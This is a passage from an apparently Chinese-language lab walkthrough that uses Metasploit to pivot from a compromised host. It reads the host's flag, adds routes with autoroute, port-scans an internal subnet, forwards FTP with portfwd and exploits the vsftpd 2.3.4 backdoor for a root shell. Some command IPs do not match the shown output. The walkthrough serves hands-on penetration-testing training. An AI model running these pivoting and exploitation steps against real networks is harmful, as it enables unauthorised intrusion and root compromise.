ls /root
cat /root/flag.txt
```

```
meterpreter > ls /root
Listing: /root
==============

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  3106  fil   2018-04-09 16:40:28 +0530  .bashrc
100644/rw-r--r--  148   fil   2015-08-17 21:00:33 +0530  .profile
100644/rw-r--r--  33    fil   2018-10-12 23:56:33 +0530  flag.txt
100755/rwxr-xr-x  1510  fil   2018-09-20 04:30:25 +0530  startup.sh

meterpreter > cat /root/flag.txt
4f96a3e848d233d5af337c440e50fe3d
```

旗帜 `4f96a3e848d233d5af337c440e50fe3d`

我们成功地利用了第一台机器并检索了第一个标志。

第 11 步：检查受感染机器上的所有可用接口

命令

```
shell
ifconfig
```

```
meterpreter > shell
Process 576 created.
Channel 1 created.
ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.162.220.3  netmask 255.255.255.0  broadcast 192.162.220.255
        ether 02:42:c0:a2:dc:03  txqueuelen 0  (Ethernet)
        RX packets 1399  bytes 193068 (193.0 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1335  bytes 438368 (438.3 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.118.144.2  netmask 255.255.255.0  broadcast 192.118.144.255
        ether 02:42:c0:76:90:02  txqueuelen 0  (Ethernet)
        RX packets 20  bytes 1656 (1.6 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

同样，机器上存在两个接口（不包括环回接口），即 eth0 和 eth1。

从 Kali 机器上 Ping eth1 IP 地址，即 192.118.144.2

```
root@INE:~# ping 192.118.144.2 -c 4
PING 192.118.144.2 (192.118.144.2) 56(84) bytes of data.

--- 192.118.144.2 ping statistics ---
4 packets transmitted, 0 received, 100% packet loss, time 3075ms
```

我们无法从 Kali 机器访问 IP 范围 192.118.144.0/24。要从 Kali 访问这个网络，我们需要执行数据透视。

第 12 步：使用“autoroute”命令将路由添加到无法访问的 IP 范围。

autoroute

此命令用于将meterpreter 会话特定路由添加到 Metasploit 的路由表。这些路由可用于转至原本无法到达的网络。

检查“自动路由”命令的帮助选项。

命令

```
run autoroute -h
```

```
^Z
Background channel 1? [y/N]  y
meterpreter > run autoroute -h

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Usage:   run autoroute [-r] -s subnet -n netmask
[*] Examples:
[*]   run autoroute -s 10.1.1.0 -n 255.255.255.0  # Add a route to 10.10.10.1/255.255.255.0
[*]   run autoroute -s 10.10.10.1                 # Netmask defaults to 255.255.255.0
[*]   run autoroute -s 10.10.10.1/24              # CIDR notation is also okay
[*]   run autoroute -p                            # Print active routing table
[*]   run autoroute -d -s 10.10.10.1              # Deletes the 10.10.10.1/255.255.255.0 route
[*] Use the "route" and "ipconfig" Meterpreter commands to learn about available routes
[-] Deprecation warning: This script has been replaced by the post/multi/manage/autoroute module
```

将路由添加到 IP 范围 192.118.144.0/24

命令

```
run autoroute -s 192.118.144.2 -n 255.255.255.0
```

```
meterpreter > run autoroute -s 192.118.144.0 -n 255.255.255.0

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 192.118.144.0/255.255.255.0...
[+] Added route to 192.118.144.0/255.255.255.0 via 192.162.220.3
[*] Use the -p option to list all active routes
```

后台meterpreter会话并检查路由是否成功添加到metasploit的路由表中。

命令

```
background
route print
```

```
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(linux/http/vcms_upload) > route print

IPv4 Active Routing Table
=========================

   Subnet             Netmask            Gateway
   ------             -------            -------
   192.118.144.0      255.255.255.0      Session 1

[*] There are currently no IPv6 routes defined.
```

路由添加成功。我们可以使用“route”命令将路由表添加到 metasploit 框架

命令

```
route add 192.69.228.0 255.255.255.0 1
```

语法：route

`add`（新建路由）

```
subnet
netmask
sid
```
（meterpreter session ID）

```
msf6 exploit(linux/http/vcms_upload) > route add 192.118.144.0 255.255.255.0 1
[*] Route already exists
```

第 13 步：我们将运行辅助 TCP 端口扫描模块来发现任何可用的主机（从 IP .3 到 .10）。并且，如果在这些主机上打开了任何端口 80、8080、445、21 和 22。

命令

```
use auxiliary/scanner/portscan/tcp
set PORTS 80, 8080, 445, 21, 22
set RHOSTS 192.69.228.3-10
exploit
```

```
msf6 exploit(linux/http/vcms_upload) > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > set PORTS 80,8080,445,21,22
PORTS => 80,8080,445,21,22
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.118.144.3-10
RHOSTS => 192.118.144.3-10
msf6 auxiliary(scanner/portscan/tcp) > set THREADS 10
THREADS => 10
msf6 auxiliary(scanner/portscan/tcp) > exploit

[+] 192.118.144.3:        - 192.118.144.3:21 - TCP OPEN
[+] 192.118.144.3:        - 192.118.144.3:22 - TCP OPEN
[*] 192.118.144.3-10:     - Scanned 1 of 8 hosts (12% complete)
[*] 192.118.144.3-10:     - Scanned 2 of 8 hosts (25% complete)
[*] 192.118.144.3-10:     - Scanned 3 of 8 hosts (37% complete)
[*] 192.118.144.3-10:     - Scanned 4 of 8 hosts (50% complete)
[*] 192.118.144.3-10:     - Scanned 4 of 8 hosts (50% complete)
[*] 192.118.144.3-10:     - Scanned 5 of 8 hosts (62% complete)
[*] 192.118.144.3-10:     - Scanned 6 of 8 hosts (75% complete)
[*] 192.118.144.3-10:     - Scanned 7 of 8 hosts (87% complete)
[*] 192.118.144.3-10:     - Scanned 8 of 8 hosts (100% complete)
[*] Auxiliary module execution completed
```

我们发现了一台主机，即192.118.144.3。端口 21 (FTP) 和 22 (SSH) 在此主机上打开。

第 14 步：在meterpreter 会话中有一个实用程序“portfwd”，它允许将远程机器端口转发到本地机器端口。我们希望以该机器的端口 21 为目标，因此我们将远程端口 21 转发到本地端口 1234。

与meterpreter会话交互并将远程端口转发到本地机器。

检查 portfwd Meterpreter 命令帮助选项。

命令

```
session -i 1
portfwd -h
```

```
msf6 auxiliary(scanner/portscan/tcp) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > portfwd -h
Usage: portfwd [-h] [add | delete | list | flush] [args]


OPTIONS:

    -h        Help banner.
    -i <opt>  Index of the port forward entry to interact with (see the "list" command).
    -l <opt>  Forward: local port to listen on. Reverse: local port to connect to.
    -L <opt>  Forward: local host to listen on (optional). Reverse: local host to connect to.
    -p <opt>  Forward: remote port to connect to. Reverse: remote port to listen on.
    -r <opt>  Forward: remote host to connect to.
    -R        Indicates a reverse port forward.
```

将远程端口转发到本地端口

命令

```
portfwd add -l 1234 -p 21 -r 192.118.144.3
portfwd list
```

`-l`本地端口

`-p`远程端口

`-r`远程主机

```
meterpreter > portfwd add -l 1234 -p 21 -r 192.118.144.3
[*] Local TCP relay created: :1234 <-> 192.118.144.3:21
meterpreter > portfwd list

Active Port Forwards
====================

   Index  Local             Remote        Direction
   -----  -----             ------        ---------
   1      192.118.144.3:21  0.0.0.0:1234  Forward

1 total active port forwards.
```

我们已经成功转发了端口。现在，使用 Nmap 扫描本地端口。

步骤 15：在转发的本地端口上运行 nmap 以识别服务名称。

命令

```
background
nmap -sS -sV -p 1234 localhost
```

```
meterpreter > background
[*] Backgrounding session 2...
msf6 exploit(linux/http/vcms_upload) > nmap -sS -sV -p 1234 localhost
[*] exec: nmap -sS -sV -p 1234 localhost

Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-03 17:37 IST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000060s latency).
Other addresses for localhost (not scanned): ::1

PORT     STATE SERVICE VERSION
1234/tcp open  ftp     vsftpd 2.0.8 or later
Service Info: Host: Welcome

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.56 seconds
```

我们可以从结果中观察到主机正在运行 vsftpd (FTP) 服务。

注意：有时扫描可能需要比预期更长的时间。请耐心等待。

第 16 步：搜索 vsftpd 漏洞利用模块

命令

```
search vsftpd
```

```
msf6 exploit(linux/http/vcms_upload) > search vsftpd

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor
```

Metasploit 框架中有一个针对 vsftpd 服务的漏洞利用。

第17步：使用vsftpd后门利用模块利用目标主机。

命令

```
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.69.228.3
exploit
id
```

```
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > use exploit/unix/ftp/vsftpd_234_backdoor
[*] Using configured payload cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.118.144.3
RHOSTS => 192.118.144.3
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit

[*] 192.118.144.3:21 - Banner: 220 Welcome to AttackDefense target FTP service.
[*] 192.118.144.3:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit

[*] 192.118.144.3:21 - The port used by the backdoor bind listener is already open
[+] 192.118.144.3:21 - UID: uid=0(root) gid=0(root) groups=0(root)
[*] Found shell.
[*] Command shell session 3 opened (0.0.0.0:0 -> 192.118.144.3:6200 via session 2) at 2022-08-03 17:49:01 +0530

id
uid=0(root) gid=0(root) groups=0(root)
```

注意：有时，漏洞利用会在第一次失败。如果发生这种情况，请再次运行漏洞利用程序。

命令

```
exploit
```

一旦漏洞利用完成，我们将在主机上获得一个会话并可以在其上运行命令。

第 18 步：检索第二个标志。

命令

```
ls /root
cat /root/flag.txt
```

```
ls /root
flag.txt
start.sh
cat /root/flag.txt
58c7c29a8ab5e7c4c06256b954947f9a
```

旗帜 `58c7c29a8ab5e7c4c06256b954947f9a`

我们已经利用了这两台机器并恢复了这两个标志！


